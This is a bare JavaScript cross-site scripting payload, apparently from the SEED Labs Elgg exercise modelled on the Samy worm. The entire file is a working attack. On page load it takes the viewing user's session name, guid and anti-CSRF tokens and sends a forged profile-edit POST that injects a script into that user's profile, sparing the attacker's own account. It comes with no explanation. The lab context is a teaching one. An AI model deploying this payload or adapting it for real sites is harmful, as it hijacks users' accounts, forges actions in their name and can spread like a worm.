
window.onload = function(){

    var userName="&name="+elgg.session.user.name;
    var guid="&guid="+elgg.session.user.guid;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="__elgg_token="+elgg.security.token.__elgg_token;

    var content= token+ts+userName+"&description=<script>alert(\'Hellorld\');</script>&accesslevel[description]=2&briefdescription=&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2"+guid;

    var samyGuid= 59;
    var sendurl= "http://www.seed-server.com/action/profile/edit";

    if(elgg.session.user.guid!=samyGuid){
    	var Ajax=null;
    	Ajax=new XMLHttpRequest();
    	Ajax.open("POST", sendurl, true);
    	Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    	Ajax.send(content);
    }
}

